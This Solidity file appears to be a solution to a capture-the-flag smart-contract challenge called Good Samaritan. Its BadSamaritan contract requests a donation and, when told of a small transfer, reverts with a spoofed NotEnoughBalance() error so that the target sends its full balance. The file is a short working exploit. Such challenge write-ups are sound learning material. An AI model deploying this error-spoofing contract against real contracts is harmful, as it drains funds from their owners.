// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {INotifyable} from "src/GoodSamaritan/GoodSamaritan.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

// Idea is to requestDonation and try to return custom error NotEnoughBalance() when notified
contract BadSamaritan is INotifyable {
    error NotEnoughBalance();

    function rob(address _target) external {
        IGoodSamaritan target = IGoodSamaritan(_target);

        target.requestDonation();
    }

    function notify(uint256 amount) external override {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
